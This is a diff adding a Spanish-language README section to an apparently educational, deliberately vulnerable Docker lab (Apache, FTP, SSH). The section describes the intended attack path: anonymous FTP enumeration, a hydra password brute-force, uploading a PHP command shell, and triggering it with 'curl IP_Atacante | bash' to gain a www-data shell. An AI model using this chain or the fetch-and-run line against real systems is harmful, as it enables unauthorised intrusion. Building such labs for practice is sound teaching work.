@@ -159,4 +159,23 @@ CMD service apache2 start && service vsftpd start && /usr/sbin/sshd -D
 - Abrimos un terminal y nos ponemos como sudo(sudo su).
 - En la misma ruta donde esta el archivo dockerfile ejecutamos el siguiente comando: docker build -t marcositb/grupo4_insecure_design:v1.0 . para crear la imagen.
 - Una vez creada la iniciamos haciendo un docker run marcositb/grupo4_insecure_design:v1.0
+
+## Que vulnerabilidades hemos hecho y como las hemos implementado:
+
+Para empezar tenemos una web inspirada en la serie The Originals. Hemos implementado los servicios apache, ftp y ssh.
+
+En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get y ls. Al hacer este ls puede observar que tiene una carpeta con un nombre de usuario.
+
+El atacante debera hacer un hydra en este usuario para sacar la contraseña, este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
+
+Tendra que subir un archivo php para ejecutar comandos desde la web. 
+
+La maquina atacante tendra lo siguiente:
+
+- Un archivo html con codigo bash dento.
+- Un terminal abierto para ponernos en escucha en http.
+
+Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash.
+Y en el terminal podemos observar que nos hemos registrado como www-data.
+
   
